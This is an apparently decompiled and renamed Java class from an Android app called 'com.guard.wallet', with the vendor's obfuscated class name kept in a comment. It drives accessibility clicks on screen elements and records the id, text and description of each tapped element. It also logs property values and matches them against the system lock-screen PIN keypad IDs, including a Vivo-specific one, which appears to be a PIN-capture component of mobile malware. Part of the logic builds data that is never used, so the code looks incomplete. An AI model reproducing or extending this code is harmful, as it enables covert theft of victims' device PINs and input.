package com.guard.wallet.helper;

import android.graphics.Rect;
import android.util.Log;
import android.view.MotionEvent;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.req.ListenPropResponse;
import java.util.LinkedList;
import java.util.function.Predicate;

/**
 * 节点匹配 Predicate — 根据动作码测试 UI 节点或监听属性。
 *
 * vendor 原名: com.guard.wallet.helper.p
 */
public final class NodePredicate implements Predicate<Object> {
    public final int a;
    public final Object b;

    public NodePredicate(Object b, int a) {
        this.a = a;
        this.b = b;
    }

    @Override
    public final boolean test(Object obj) {
        switch (a) {
            case 0:
                return testClickTarget((UiObject) obj);
            default:
                return testListenProp((ListenPropResponse) obj);
        }
    }

    private boolean testClickTarget(UiObject uiObject) {
        if (uiObject == null) return false;
        Rect screen = uiObject.boundsInScreen();
        Rect parent = uiObject.boundsInParent();
        if (screen == null || parent == null) return false;

        int dx = Math.max(0, (parent.width() - screen.width()) / 2);
        int dy = Math.max(0, (parent.height() - screen.height()) / 2);
        if (dx > 0 || dy > 0) {
            screen.left -= dx;
            screen.right += dx;
            screen.top -= dy;
            screen.bottom += dy;
        }

        MotionEvent event = (MotionEvent) this.b;
        if (screen.contains((int) event.getX(), (int) event.getY())) {
            if (uiObject.click()) {
                Point center = new Point(screen.exactCenterX(), screen.exactCenterY());
                AutomationHelper.f = AutomationHelper.f + 1;
                LinkedList<ListenPropResponse> props = new LinkedList<>();
                if (uiObject.id() != null && !uiObject.id().isEmpty()) {
                    props.add(new ListenPropResponse(AutomationHelper.f, "id", uiObject.id(), System.nanoTime()));
                }
                if (uiObject.text() != null && !uiObject.text().isEmpty()) {
                    props.add(new ListenPropResponse(AutomationHelper.f, "text", uiObject.text(), System.nanoTime()));
                }
                if (uiObject.desc() != null && !uiObject.desc().isEmpty()) {
                    props.add(new ListenPropResponse(AutomationHelper.f, "desc", uiObject.desc(), System.nanoTime()));
                }
            }
            return true;
        }
        return false;
    }

    private boolean testListenProp(ListenPropResponse prop) {
        if (prop == null || prop.getValue() == null || prop.getValue().isEmpty()) return false;
        Log.e("com.guard.wallet.plug.c", prop.getValue());
        return prop.getValue().startsWith("com.android.systemui:id/key")
            || prop.getValue().startsWith("com.android.systemui:id/VivoPinkey");
    }
}
